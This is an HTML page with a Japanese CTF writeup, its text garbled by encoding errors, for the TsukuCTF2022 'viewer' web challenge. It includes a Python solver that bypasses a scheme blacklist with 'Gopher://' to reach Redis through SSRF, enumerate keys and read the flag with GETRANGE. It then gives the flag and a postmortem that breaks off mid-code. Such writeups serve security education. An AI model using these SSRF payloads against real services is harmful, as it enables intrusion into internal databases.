<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width"/><meta charSet="utf-8"/><title>viewer-TsukuCTF2022</title><meta name="description" content="ã“ã®ã‚µã‚¤ãƒˆã¯SecHack365ä¿®äº†ç”Ÿã‚ˆã£ã¦é‹å–¶ã•ã‚Œã¦ã„ã‚‹éå…¬å¼ã®ã®ãƒ•ã‚¡ãƒ³ãƒšãƒ¼ã‚¸ã§ã™ã€‚"/><link rel="icon" href="/favicon.ico"/><meta name="og:title" content="viewer-TsukuCTF2022"/><meta property="og:type" content="website"/><meta name="twitter:card" content="summary_large_image"/><meta property="og:image" content="https://opengraph.githubassets.com/139256f8ccf77c03f7d9d1b51e30822cb3d14d45abeae53f15384cefc9c7e9da/SecHack365-Fans/SecHack365-Fans.github.io"/><meta name="next-head-count" content="9"/><link rel="preload" href="/_next/static/css/d08ae8051f58b610.css" as="style"/><link rel="stylesheet" href="/_next/static/css/d08ae8051f58b610.css" data-n-g=""/><link rel="preload" href="/_next/static/css/9559f1eba3ad545f.css" as="style"/><link rel="stylesheet" href="/_next/static/css/9559f1eba3ad545f.css" data-n-p=""/><noscript data-n-css=""></noscript><script defer="" nomodule="" src="/_next/static/chunks/polyfills-5cd94c89d3acac5f.js"></script><script src="/_next/static/chunks/webpack-49b6f2937c9ce9f4.js" defer=""></script><script src="/_next/static/chunks/framework-dc33c0b5493501f0.js" defer=""></script><script src="/_next/static/chunks/main-056d531d8af152ad.js" defer=""></script><script src="/_next/static/chunks/pages/_app-7e2d3fd7c9a12493.js" defer=""></script><script src="/_next/static/chunks/482-bd5197ea93394ef2.js" defer=""></script><script src="/_next/static/chunks/754-b8465c1d17288366.js" defer=""></script><script src="/_next/static/chunks/pages/ctf/TsukuCTF2022/%5Bid%5D-a940fa4d97f457fe.js" defer=""></script><script src="/_next/static/E8Mu5MlMTR0xFKIeOx1KX/_buildManifest.js" defer=""></script><script src="/_next/static/E8Mu5MlMTR0xFKIeOx1KX/_ssgManifest.js" defer=""></script><script src="/_next/static/E8Mu5MlMTR0xFKIeOx1KX/_middlewareManifest.js" defer=""></script></head><body><div id="__next" data-reactroot=""><div><style data-emotion="css 1yjo05o">.css-1yjo05o{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-flex-direction:row;-ms-flex-direction:row;flex-direction:row;}.css-1yjo05o>:not(style)+:not(style){margin:0;margin-left:8px;}</style><div class="Navigator_navbar__1D91M css-1yjo05o"><span class="Navigator_left__6lj_E"><style data-emotion="css 11qrfta">.css-11qrfta{font-family:"Roboto","Helvetica","Arial",sans-serif;font-weight:500;font-size:0.875rem;line-height:1.75;letter-spacing:0.02857em;text-transform:uppercase;min-width:64px;padding:6px 8px;border-radius:4px;-webkit-transition:background-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,box-shadow 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,border-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;transition:background-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,box-shadow 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,border-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;color:#1976d2;}.css-11qrfta:hover{-webkit-text-decoration:none;text-decoration:none;background-color:rgba(25, 118, 210, 0.04);}@media (hover: none){.css-11qrfta:hover{background-color:transparent;}}.css-11qrfta.Mui-disabled{color:rgba(0, 0, 0, 0.26);}</style><style data-emotion="css 1ujsas3">.css-1ujsas3{display:-webkit-inline-box;display:-webkit-inline-flex;display:-ms-inline-flexbox;display:inline-flex;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;-webkit-box-pack:center;-ms-flex-pack:center;-webkit-justify-content:center;justify-content:center;position:relative;box-sizing:border-box;-webkit-tap-highlight-color:transparent;background-color:transparent;outline:0;border:0;margin:0;border-radius:0;padding:0;cursor:pointer;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;vertical-align:middle;-moz-appearance:none;-webkit-appearance:none;-webkit-text-decoration:none;text-decoration:none;color:inherit;font-family:"Roboto","Helvetica","Arial",sans-serif;font-weight:500;font-size:0.875rem;line-height:1.75;letter-spacing:0.02857em;text-transform:uppercase;min-width:64px;padding:6px 8px;border-radius:4px;-webkit-transition:background-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,box-shadow 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,border-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;transition:background-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,box-shadow 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,border-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;color:#1976d2;}.css-1ujsas3::-moz-focus-inner{border-style:none;}.css-1ujsas3.Mui-disabled{pointer-events:none;cursor:default;}@media print{.css-1ujsas3{-webkit-print-color-adjust:exact;color-adjust:exact;}}.css-1ujsas3:hover{-webkit-text-decoration:none;text-decoration:none;background-color:rgba(25, 118, 210, 0.04);}@media (hover: none){.css-1ujsas3:hover{background-color:transparent;}}.css-1ujsas3.Mui-disabled{color:rgba(0, 0, 0, 0.26);}</style><a class="MuiButton-root MuiButton-text MuiButton-textPrimary MuiButton-sizeMedium MuiButton-textSizeMedium MuiButtonBase-root Navigator_button__W2T1X Navigator_home__FJLJi css-1ujsas3" tabindex="0" href="/">TOP</a><a class="MuiButton-root MuiButton-text MuiButton-textPrimary MuiButton-sizeMedium MuiButton-textSizeMedium MuiButtonBase-root Navigator_button__W2T1X Navigator_otherLink__EgnaA css-1ujsas3" tabindex="0" href="/blog">å‚åŠ è¨˜</a><a class="MuiButton-root MuiButton-text MuiButton-textPrimary MuiButton-sizeMedium MuiButton-textSizeMedium MuiButtonBase-root Navigator_button__W2T1X Navigator_otherLink__EgnaA css-1ujsas3" tabindex="0" href="/timer">â€ ç· åˆ‡é§†å‹•ã‚³ãƒ¼ã‚¹â€ </a><a class="MuiButton-root MuiButton-text MuiButton-textPrimary MuiButton-sizeMedium MuiButton-textSizeMedium MuiButtonBase-root Navigator_button__W2T1X Navigator_otherLink__EgnaA css-1ujsas3" tabindex="0" href="/ctf">TsukuCTF</a></span><span class="Navigator_right__OcvPs"><a class="MuiButton-root MuiButton-text MuiButton-textPrimary MuiButton-sizeMedium MuiButton-textSizeMedium MuiButtonBase-root Navigator_button__W2T1X Navigator_otherLink__EgnaA Navigator_right__OcvPs css-1ujsas3" tabindex="0" href="https://github.com/SecHack365-Fans/SecHack365-Fans.github.io"><style data-emotion="css vubbuv">.css-vubbuv{-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;width:1em;height:1em;display:inline-block;fill:currentColor;-webkit-flex-shrink:0;-ms-flex-negative:0;flex-shrink:0;-webkit-transition:fill 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;transition:fill 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;font-size:1.5rem;}</style><svg class="MuiSvgIcon-root MuiSvgIcon-fontSizeMedium css-vubbuv" focusable="false" aria-hidden="true" viewBox="0 0 24 24" data-testid="GitHubIcon"><path d="M12 1.27a11 11 0 00-3.48 21.46c.55.09.73-.28.73-.55v-1.84c-3.03.64-3.67-1.46-3.67-1.46-.55-1.29-1.28-1.65-1.28-1.65-.92-.65.1-.65.1-.65 1.1 0 1.73 1.1 1.73 1.1.92 1.65 2.57 1.2 3.21.92a2 2 0 01.64-1.47c-2.47-.27-5.04-1.19-5.04-5.5 0-1.1.46-2.1 1.2-2.84a3.76 3.76 0 010-2.93s.91-.28 3.11 1.1c1.8-.49 3.7-.49 5.5 0 2.1-1.38 3.02-1.1 3.02-1.1a3.76 3.76 0 010 2.93c.83.74 1.2 1.74 1.2 2.94 0 4.21-2.57 5.13-5.04 5.4.45.37.82.92.82 2.02v3.03c0 .27.1.64.73.55A11 11 0 0012 1.27"></path></svg></a></span></div><div style="padding:15px"><h1>viewer</h1>
<h2>ã¯ã˜ã‚ã«</h2>
<p>æœ¬å•é¡Œã§é…å¸ƒã•ã‚ŒãŸã‚³ãƒ¼ãƒ‰ã®ä¸€éƒ¨ã«å®Ÿè£…ä¸å‚™ãŒã‚ã‚Šå‚åŠ è€…ä½“é¨“ã‚’æ‚ªãã—ã¦ã—ã¾ã£ãŸã“ã¨ã‚’ã€CTF çµ‚äº†å¾Œã«å¹¾ã¤ã‹ã®ãƒ–ãƒ­ã‚°è¨˜äº‹ã‚„ãƒ„ã‚¤ãƒ¼ãƒˆã‹ã‚‰çŸ¥ã‚Šã¾ã—ãŸã€‚ã“ã®ä»¶ã«é–¢ã—ã¦ã€ä¸‡å…¨ã®å•é¡Œæä¾›ãŒã§ããªã‹ã£ãŸã“ã¨ã‚’ãŠè©«ã³ç”³ã—ä¸Šã’ã¾ã™ã€‚</p>
<p>å†ç™ºé˜²æ­¢ã®ãŸã‚ã«é…å¸ƒã•ã‚Œã‚‹ã‚³ãƒ¼ãƒ‰ã¨æœ¬ç•ªç’°å¢ƒã®ã‚³ãƒ¼ãƒ‰ã«å·®ç•°ã‚’ç”Ÿã¾ãªã„ã‚ˆã†ãƒ¬ãƒ“ãƒ¥ãƒ¼æ®µéšã§æ³¨æ„ã™ã‚‹äºˆå®šã§ã™ã€‚ãã—ã¦ã€å‚åŠ è€…ã®çš†æ§˜ã«ã¨ã£ã¦ã‚ˆã‚Šè‰¯ã„ CTF ã«ã™ã‚‹ãŸã‚ã«ã‚‚ã€ä¸å¯©ãªç‚¹ãªã©ãŒã‚ã‚Œã° Discord ã®#ask-to-admin ã§ã”ç¢ºèªã„ãŸã ã‘ã‚‹ã¨éå¸¸ã«ã‚ã‚ŠãŒãŸã„ã§ã™ã€‚ã‚ˆã‚ã—ããŠé¡˜ã„ã—ã¾ã™ã€‚</p>
<p>ã¾ãŸã€ã“ã‚Œã«ä¼´ã„ç°¡å˜ãªãƒã‚¹ãƒˆãƒ¢ãƒ¼ãƒ†ãƒ ã‚’è¡Œã£ãŸãŸã‚ Writeup æœ«å°¾ã«è¿½è¨˜ã—ã¾ã™ã€‚æœ¬ä»¶ã«èˆˆå‘³ãŒã‚ã‚‹æ–¹ã¯ã”è¦§ãã ã•ã„ã€‚</p>
<h2>å•é¡Œæ–‡</h2>
<p>Writeups for TsukuCTF21 have been published.
Check them out if you&#x27;d like!</p>
<h2>é›£æ˜“åº¦</h2>
<p>Medium</p>
<h2>è§£æ³•</h2>
<p>é…å¸ƒã•ã‚Œã¦ã„ã‚‹ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰ã‚’èª­ã‚€ã¨ã€redis ã®ä¸­ã« FLAG ãŒå«ã¾ã‚Œã¦ã„ã‚‹ã“ã¨ãŒåˆ†ã‹ã‚‹ã€‚<br/>
<!-- -->curl ã§ redis ã¨ã„ã†ã“ã¨ã¯åˆ¥ãƒ—ãƒ­ãƒˆã‚³ãƒ«ã‚’åˆ©ç”¨ã—ãŸ SSRF ãŒæ€ã„æµ®ã‹ã¶ã€‚<br/>
<!-- -->Flag ãŒå­˜åœ¨ã—ã¦ã„ã‚‹å ´æ‰€ã¯<code class="undefined MarkdownRender_inlineCode__5ZUcq" node="[object Object]">app.py</code> ä¸Šã‹ redis å†…éƒ¨ã§ã‚ã‚‹ãŸã‚ã€ã„ãšã‚Œã‹ã®æƒ…å ±ã‚’æŠœãå–ã‚ŠãŸã„ã€‚<br/>
<!-- -->å‰è€…ã¯ <code class="undefined MarkdownRender_inlineCode__5ZUcq" node="[object Object]">file://</code> schemeã€å¾Œè€…ã¯ <code class="undefined MarkdownRender_inlineCode__5ZUcq" node="[object Object]">gopher://</code> ã‚„<code class="undefined MarkdownRender_inlineCode__5ZUcq" node="[object Object]">dict://</code> scheme ã‚’åˆ©ç”¨ã™ã‚‹ã“ã¨ã«ãªã‚Šãã†ã ã€‚</p>
<p>ã—ã‹ã—ã€å‰è€…ã¯ä»¥ä¸‹ã® <code class="undefined MarkdownRender_inlineCode__5ZUcq" node="[object Object]">response_sanitizer</code> ã«ã‚ˆã£ã¦ã‚µãƒ‹ã‚¿ã‚¤ã‚ºã•ã‚Œã‚‹ãŸã‚ã€å¾Œè€…ã‚’åˆ©ç”¨ã™ã‚‹ã“ã¨ã«ã™ã‚‹ã€‚</p>
<pre><div node="[object Object]" class="MarkdownRender_code__r6Sqc" style="color:#ccc;background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto"><code class="language-python" style="color:#ccc;background:none;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token token" style="color:#999"># app.py</span><span>
</span><span></span><span class="token token" style="color:#999"># a response is also sanitized just in case because the flag is super sensitive information.</span><span>
</span><span>blacklist_in_response </span><span class="token token" style="color:#67cdcc">=</span><span> </span><span class="token token" style="color:#ccc">[</span><span class="token token" style="color:#7ec699">&#x27;TsukuCTF22&#x27;</span><span class="token token" style="color:#ccc">]</span><span>
</span>
<span></span><span class="token token" style="color:#cc99cd">def</span><span> </span><span class="token token" style="color:#f08d49">response_sanitizer</span><span class="token token" style="color:#ccc">(</span><span>body</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#cc99cd">str</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#67cdcc">-</span><span class="token token" style="color:#67cdcc">&gt;</span><span> </span><span class="token token" style="color:#cc99cd">str</span><span class="token token" style="color:#ccc">:</span><span>
</span><span>    </span><span class="token token" style="color:#cc99cd">if</span><span> </span><span class="token token" style="color:#cc99cd">any</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">[</span><span>scheme </span><span class="token token" style="color:#cc99cd">in</span><span> body </span><span class="token token" style="color:#cc99cd">for</span><span> scheme </span><span class="token token" style="color:#cc99cd">in</span><span> blacklist_in_response</span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">:</span><span>
</span><span>        </span><span class="token token" style="color:#cc99cd">return</span><span> </span><span class="token token" style="color:#7ec699">&quot;SANITIZED: a sensitive data is included!&quot;</span><span>
</span><span>    </span><span class="token token" style="color:#cc99cd">return</span><span> body</span></code></div></pre>
<p><code class="undefined MarkdownRender_inlineCode__5ZUcq" node="[object Object]">gopher://</code> ç­‰ã¯ç¦æ­¢ã•ã‚Œã¦ã„ã‚‹ã‚ˆã†ã«è¦‹ãˆã‚‹ãŒã€case-insensitive ãªã®ã§å¤§æ–‡å­—ã‚’å«ã‚ã‚‹ã“ã¨ã§å›é¿ã§ãã‚‹ã€‚</p>
<p>ãŸã ã—ã€gopher ã§å¯¾è±¡ã® value ã‚’å–ã‚‹ãŸã‚ã«ã€redis ã® key ã‚’çŸ¥ã‚‹å¿…è¦ãŒã‚ã‚‹ã€‚<br/>
<!-- -->key ã¯ redis ã® <code class="undefined MarkdownRender_inlineCode__5ZUcq" node="[object Object]">keys *</code> ã§å…¨åˆ—æŒ™ã§ãã‚‹ãŸã‚ã€å…¨ã¦ã® key ã‚’åˆ—æŒ™ã—ã¦ response ã« flag ãŒå«ã¾ã‚Œã‚‹ã‚‚ã®ã‚’é¸æŠã™ã‚Œã°è‰¯ã„ã€‚</p>
<p>ã¾ãŸã€<code class="undefined MarkdownRender_inlineCode__5ZUcq" node="[object Object]">TsukuCTF22</code>ã¨ã„ã†æ–‡å­—åˆ—ã‚’å«ã‚€å ´åˆã¯ã‚µãƒ‹ã‚¿ã‚¤ã‚ºã•ã‚Œã‚‹ãŒã€<code class="undefined MarkdownRender_inlineCode__5ZUcq" node="[object Object]">GETRANGE</code> ã§ä¸€éƒ¨ã‚’æŠœãå‡ºã™ã“ã¨ã§å¯¾å‡¦ã§ãã‚‹ã€‚<br/>
<!-- -->ã—ãŸãŒã£ã¦ã€æ–¹é‡ã¯ä»¥ä¸‹ã®é€šã‚Šã«ãªã‚‹ã€‚<br/>
<!-- -->ã¾ãšã€redis ã«å«ã¾ã‚Œã‚‹ key ã‚’å…¨åˆ—æŒ™ã—ã€æ¬¡ã« GETRANGE ã§åˆ—æŒ™ã—ãŸã‚‚ã®ã®ä¸€éƒ¨ã‚’èª­ã¿å–ã‚‹ã€‚</p>
<p>solver ã¯ä»¥ä¸‹ã®é€šã‚Šã€‚</p>
<pre><div node="[object Object]" class="MarkdownRender_code__r6Sqc" style="color:#ccc;background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto"><code class="language-python" style="color:#ccc;background:none;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token token" style="color:#cc99cd">import</span><span> requests
</span><span></span><span class="token token" style="color:#cc99cd">from</span><span> urllib</span><span class="token token" style="color:#ccc">.</span><span>parse </span><span class="token token" style="color:#cc99cd">import</span><span> quote
</span><span></span><span class="token token" style="color:#cc99cd">import</span><span> re
</span><span></span><span class="token token" style="color:#cc99cd">import</span><span> sys
</span>
<span></span><span class="token token" style="color:#999"># CHANGE HERE with an appropriate url</span><span>
</span><span>TARGET_URL </span><span class="token token" style="color:#67cdcc">=</span><span> </span><span class="token token" style="color:#7ec699">&quot;http://127.0.0.1:31555&quot;</span><span>
</span>
<span></span><span class="token token" style="color:#999"># enumerate redis keys</span><span>
</span><span>form </span><span class="token token" style="color:#67cdcc">=</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span>    </span><span class="token token" style="color:#7ec699">&quot;url&quot;</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#7ec699">&quot;Gopher://redis:6379/+&quot;</span><span> </span><span class="token token" style="color:#67cdcc">+</span><span> quote</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#7ec699">&quot;keys *\r\nQUIT\r\n&quot;</span><span class="token token" style="color:#ccc">)</span><span>
</span><span></span><span class="token token" style="color:#ccc">}</span><span>
</span><span>cookies </span><span class="token token" style="color:#67cdcc">=</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span>    </span><span class="token token" style="color:#7ec699">&quot;__SESSION_ID&quot;</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#7ec699">&quot;d8c7d141-b8da-416b-a220-d8d7218c8bbc&quot;</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#999"># dummy session id</span><span>
</span><span></span><span class="token token" style="color:#ccc">}</span><span>
</span><span>res </span><span class="token token" style="color:#67cdcc">=</span><span> requests</span><span class="token token" style="color:#ccc">.</span><span>post</span><span class="token token" style="color:#ccc">(</span><span>TARGET_URL</span><span class="token token" style="color:#ccc">,</span><span> data</span><span class="token token" style="color:#67cdcc">=</span><span>form</span><span class="token token" style="color:#ccc">,</span><span> cookies</span><span class="token token" style="color:#67cdcc">=</span><span>cookies</span><span class="token token" style="color:#ccc">)</span><span>
</span>
<span>session_id_list </span><span class="token token" style="color:#67cdcc">=</span><span> re</span><span class="token token" style="color:#ccc">.</span><span>findall</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#7ec699">&quot;(.+-.+-.+-.+-.+)\r&quot;</span><span class="token token" style="color:#ccc">,</span><span> res</span><span class="token token" style="color:#ccc">.</span><span>text</span><span class="token token" style="color:#ccc">)</span><span>
</span><span></span><span class="token token" style="color:#999"># print(session_id_list)</span><span>
</span>
<span></span><span class="token token" style="color:#999"># check redis value</span><span>
</span><span></span><span class="token token" style="color:#cc99cd">for</span><span> session_id </span><span class="token token" style="color:#cc99cd">in</span><span> session_id_list</span><span class="token token" style="color:#ccc">:</span><span>
</span><span>    form</span><span class="token token" style="color:#ccc">[</span><span class="token token" style="color:#7ec699">&quot;url&quot;</span><span class="token token" style="color:#ccc">]</span><span> </span><span class="token token" style="color:#67cdcc">=</span><span> </span><span class="token token" style="color:#7ec699">&quot;Gopher://redis:6379/+&quot;</span><span> </span><span class="token token" style="color:#67cdcc">+</span><span> quote</span><span class="token token" style="color:#ccc">(</span><span class="token token string-interpolation" style="color:#7ec699">f&quot;GETRANGE </span><span class="token token string-interpolation interpolation" style="color:#ccc">{</span><span class="token token string-interpolation interpolation">session_id</span><span class="token token string-interpolation interpolation" style="color:#ccc">}</span><span class="token token string-interpolation" style="color:#7ec699"> 60 -1\r\nQUIT\r\n&quot;</span><span class="token token" style="color:#ccc">)</span><span>
</span><span>    cookies</span><span class="token token" style="color:#ccc">[</span><span class="token token" style="color:#7ec699">&quot;__SESSION_ID&quot;</span><span class="token token" style="color:#ccc">]</span><span> </span><span class="token token" style="color:#67cdcc">=</span><span> session_id
</span><span>    res </span><span class="token token" style="color:#67cdcc">=</span><span> requests</span><span class="token token" style="color:#ccc">.</span><span>post</span><span class="token token" style="color:#ccc">(</span><span>TARGET_URL</span><span class="token token" style="color:#ccc">,</span><span> data</span><span class="token token" style="color:#67cdcc">=</span><span>form</span><span class="token token" style="color:#ccc">,</span><span> cookies</span><span class="token token" style="color:#67cdcc">=</span><span>cookies</span><span class="token token" style="color:#ccc">)</span><span>
</span><span>    </span><span class="token token" style="color:#cc99cd">if</span><span> </span><span class="token token" style="color:#7ec699">&quot;CTF22{&quot;</span><span> </span><span class="token token" style="color:#cc99cd">in</span><span> res</span><span class="token token" style="color:#ccc">.</span><span>text</span><span class="token token" style="color:#ccc">:</span><span>
</span><span>        </span><span class="token token" style="color:#cc99cd">print</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#7ec699">&quot;TsukuCTF22{&quot;</span><span> </span><span class="token token" style="color:#67cdcc">+</span><span> res</span><span class="token token" style="color:#ccc">.</span><span>text</span><span class="token token" style="color:#ccc">[</span><span>res</span><span class="token token" style="color:#ccc">.</span><span>text</span><span class="token token" style="color:#ccc">.</span><span>find</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#7ec699">&quot;CTF22{&quot;</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#67cdcc">+</span><span> </span><span class="token token" style="color:#cc99cd">len</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#7ec699">&quot;CTF22{&quot;</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">:</span><span>res</span><span class="token token" style="color:#ccc">.</span><span>text</span><span class="token token" style="color:#ccc">.</span><span>find</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#7ec699">&quot;}&amp;#34;&quot;</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">]</span><span> </span><span class="token token" style="color:#67cdcc">+</span><span> </span><span class="token token" style="color:#7ec699">&quot;}&quot;</span><span class="token token" style="color:#ccc">)</span><span>
</span><span>        sys</span><span class="token token" style="color:#ccc">.</span><span>exit</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#f08d49">0</span><span class="token token" style="color:#ccc">)</span><span>
</span>
</code></div></pre>
<p>ä¸Šè¨˜ã®ã‚½ãƒ«ãƒã‚’å®Ÿè¡Œã™ã‚‹ã¨ã€ä»¥ä¸‹ã® Flag ãŒå¾—ã‚‰ã‚Œã‚‹ã€‚</p>
<pre><code class="undefined MarkdownRender_inlineCode__5ZUcq" node="[object Object]">TsukuCTF22{ur1_scheme_1s_u5efu1}
</code></pre>
<h2>ãƒã‚¹ãƒˆãƒ¢ãƒ¼ãƒ†ãƒ </h2>
<h3>ä½•ãŒèµ·ã“ã£ãŸã‹</h3>
<p>å‰æã¨ã—ã¦ã€å®Ÿè£…ã‚³ãƒ¼ãƒ‰ã«ä¸å‚™ãŒã‚ã£ãŸãŸã‚ã«ã€å•é¡Œã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹æ™‚ã« Cookie ã«æ ¼ç´ã•ã‚Œã‚‹ <code class="undefined MarkdownRender_inlineCode__5ZUcq" node="[object Object]">__SESSION_ID</code> ãŒå…±æœ‰ã•ã‚Œã¦ã„ã‚‹ã¨ã„ã†å•é¡ŒãŒã‚ã‚Šã¾ã—ãŸã€‚</p>
<p>æœ¬æ¥ã§ã‚ã‚Œã°ã“ã®å•é¡Œã«ã‚ˆã‚Š Flag ãŒå–å¾—ã§ããªã„ã¯ãšã§ã™ã€‚ã—ã‹ã—ã€é…å¸ƒã•ã‚ŒãŸã‚³ãƒ¼ãƒ‰ã¨æœ¬ç•ªç’°å¢ƒã®ã‚³ãƒ¼ãƒ‰ã® Flag ã‚’ Redis ã«è¿½åŠ ã™ã‚‹éƒ¨åˆ†ã«å·®ç•°ãŒã‚ã£ãŸãŸã‚ã«ã€é…å¸ƒã•ã‚ŒãŸã‚³ãƒ¼ãƒ‰ã§æ§‹ç¯‰ã§ãã‚‹ç’°å¢ƒã«ã‚ˆã£ã¦ã¯ Flag ãŒå–å¾—ã§ããªã„ã«ã‚‚æ‹˜ã‚‰ãšã€æœ¬ç•ªç’°å¢ƒã§ã¯ Flag ãŒå–å¾—ã§ãã‚‹ã¨ã„ã†ç¾è±¡ãŒèµ·ãã¾ã—ãŸã€‚</p>
<p>å®Ÿéš›ã«æœ¬ç•ªä¸­ã¯ã‚½ãƒ«ãƒã«ã‚ˆã£ã¦ Flag ãŒå–å¾—ã§ãã‚‹ã“ã¨ã®ã¿ã‚’ç¢ºèªã—ã¦ã„ãŸãŸã‚ã€ã“ã®å•é¡Œã«æ°—ã¥ã‘ã¾ã›ã‚“ã§ã—ãŸã€‚</p>
<h3>æŠ€è¡“çš„è©³ç´°</h3>
<p>ã‚³ãƒ¼ãƒ‰ã‚’ç”¨ã„ã¦å…·ä½“çš„ã«èª¬æ˜ã—ã¾ã™ã€‚</p>
<p>ã¾ãšã€ä»¥ä¸‹ãŒé…å¸ƒã•ã‚ŒãŸã‚³ãƒ¼ãƒ‰ã§ Flag ã‚’ Redis ã«è¿½åŠ ã™ã‚‹éƒ¨åˆ†ã®ã‚³ãƒ¼ãƒ‰ã§ã™ã€‚</p>
<pre><div node="[object Object]" class="MarkdownRender_code__r6Sqc" style="color:#ccc;background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto"><code class="language-python" style="color:#ccc;background:none;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token token" style="color:#999"># initialization</span><span>
</span><span>redis </span><span class="token token" style="color:#67cdcc">=</span><span> redis</span><span class="token token" style="color:#ccc">.</span><span>Redis</span><span class="token token" style="color:#ccc">(</span><span>host</span><span class="token token" style="color:#67cdcc">=</span><span class="token token" style="color:#7ec699">&#x27;redis&#x27;</span><span class="token token" style="color:#ccc">,</span><span> port</span><span class="token token" style="color:#67cdcc">=</span><span class="token token" style="color:#f08d49">6379</span><span class="token token" style="color:#ccc">,</span><span> db</span><span class="token token" style="color:#67cdcc">=</span><span class="token token" style="color:#f08d49">0</span><span class="token token" style="color:#ccc">)</span><span>
</span><span>flag </span><span class="token token" style="color:#67cdcc">=</span><span> </span><span class="token token" style="color:#7ec699">&quot;TsukuCTF22{dummy flag}&quot;</span><span> </span><span class="token token" style="color:#999"># the flag is replaced a real flag in a production environment.</span><span>
</span><span></span><span class="token token" style="color:#cc99cd">id</span><span> </span><span class="token token" style="color:#67cdcc">=</span><span> </span><span class="token token" style="color:#cc99cd">str</span><span class="token token" style="color:#ccc">(</span><span>uuid</span><span class="token token" style="color:#ccc">.</span><span>uuid4</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">)</span><span>
